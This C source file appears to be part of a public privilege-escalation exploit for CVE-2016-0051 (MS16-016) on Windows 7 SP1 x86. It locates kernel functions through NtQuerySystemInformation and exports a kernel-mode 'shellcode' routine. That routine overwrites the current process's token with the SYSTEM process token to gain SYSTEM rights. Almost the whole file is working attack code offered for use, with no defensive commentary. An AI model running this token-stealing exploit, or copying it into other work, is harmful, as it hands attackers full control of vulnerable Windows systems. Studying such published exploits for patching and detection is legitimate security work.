/*

Elevation of Privilege (SYSTEM) exploit for CVE-2016-0051 (MS16-016), works on Windows 7 SP1 x86 (build 7601)
Creator: Tam�s Koczka (@koczkatamas - https://twitter.com/koczkatamas)
Original source: https://github.com/koczkatamas/CVE-2016-0051

*/
#include <windows.h>

typedef enum _SYSTEM_INFORMATION_CLASS
{
	SystemModuleInformation = 11,
	SystemHandleInformation = 16
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS (WINAPI *_NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, 
	PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

typedef struct {
	PVOID   Unknown1;
	PVOID   Unknown2;
	PVOID   Base;
	ULONG   Size;
	ULONG   Flags;
	USHORT  Index;
	USHORT  NameLength;
	USHORT  LoadCount;
	USHORT  PathLength;
	CHAR    ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct {
	ULONG   Count;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

// based on http://www.attackingthecore.com/codex.php?chp=chapter6

FARPROC GetKernAddress(HMODULE UserKernBase, PVOID RealKernelBase, LPCSTR SymName)
{
	auto addr = GetProcAddress(UserKernBase, SymName);
	return addr == NULL ? NULL : (FARPROC)((PUCHAR)addr - (PUCHAR)UserKernBase + (PUCHAR)RealKernelBase);
}

int GetKernelBaseInfo(PVOID* kernelBase, char** kernelImage)
{
	auto ntdllHandle = GetModuleHandle("ntdll");
	if (!ntdllHandle) return 1;

	auto NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(ntdllHandle, "NtQuerySystemInformation");
	if (!NtQuerySystemInformation) return 2;

	ULONG len;
	auto ret = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	//if (!NT_SUCCESS(ret)) return 3;

	auto pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
	ret = NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, &len);
	if (!NT_SUCCESS(ret)) return 4;

	*kernelImage = pModuleInfo->Module[0].ImageName;
	*kernelBase = pModuleInfo->Module[0].Base;

	return 0;
}

typedef          VOID *PEPROCESS;
typedef         ULONG(__cdecl   *_DbgPrintEx)(_In_ ULONG ComponentId, _In_ ULONG Level, PCHAR  Format, ...);
typedef      NTSTATUS(__stdcall *_PsLookupProcessByProcessId)(HANDLE ProcessId, PEPROCESS *Process);

_DbgPrintEx                 DbgPrintEx;
_PsLookupProcessByProcessId PsLookupProcessByProcessId;

extern "C" __declspec(dllexport) int __stdcall LoadAndGetKernelBase()
{
	char* NTosFn = 0;
	PVOID kBase = NULL;
	auto ret = GetKernelBaseInfo(&kBase, &NTosFn);
	if (ret) return ret;

	for (char* tmp = NTosFn; *tmp != 0; tmp++)
		if (*tmp == '\\')
			NTosFn = tmp + 1;

	auto NTosHandle = LoadLibraryA(NTosFn);
	if (NTosHandle == NULL) return 10;

	DbgPrintEx = (_DbgPrintEx)GetKernAddress(NTosHandle, kBase, "DbgPrintEx");
	PsLookupProcessByProcessId = (_PsLookupProcessByProcessId)GetKernAddress(NTosHandle, kBase, "PsLookupProcessByProcessId");

	if (!DbgPrintEx || !PsLookupProcessByProcessId) return 11;

	return 0;
}

int tokenOffset = 0xf8; // change me if OS is not Windows 7 SP1 x86 (7601)

extern "C" __declspec(dllexport) int __stdcall shellcode(int a, int b)
{
	DbgPrintEx(79, 0, "[-] Greetings from the kernel land\r\n");

	DWORD pidOur = GetCurrentProcessId(), pidSystem = 4;

	PEPROCESS pOur = NULL, pSystem = NULL;
	NTSTATUS resOur = PsLookupProcessByProcessId((HANDLE)pidOur, &pOur);
	NTSTATUS resSystem = PsLookupProcessByProcessId((HANDLE)4, &pSystem);

	DbgPrintEx(79, 0, "[-] Our EPROCESS at: %p (res = %d), System EPROCESS At: %p (res = %d)\r\n", pOur, resOur, pSystem, resSystem);
	if (NT_SUCCESS(resOur) && NT_SUCCESS(resSystem))
		*(PVOID *)((PBYTE)pOur + tokenOffset) = *(PVOID *)((PBYTE)pSystem + tokenOffset);

    return 1337;
}